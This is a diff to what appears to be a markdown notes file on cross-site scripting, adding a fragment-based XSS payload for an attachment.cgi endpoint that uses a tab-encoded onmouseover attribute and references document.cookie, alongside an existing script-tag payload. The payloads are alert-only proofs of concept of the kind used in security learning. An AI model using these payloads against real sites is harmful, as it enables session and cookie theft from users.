@@ -103,6 +103,10 @@ If you send the xss in the example1, the backend could detect and block/sanitize
 /attachment.cgi?id=&action=
   foobar#<script>alert(document.cookie)</script>
   ```
+This # fragment has another neat trick I have learned from [this](https://youtu.be/Wbovgw3Qxxc?t=840) streamer
+```
+attachment.cgi?id=&%09onmouseover=alert(document.location.hash.substring(1))#document.cookie
+```
 
 For example, this will trigger a xss on error, which will occur because src is empty. 
 ```
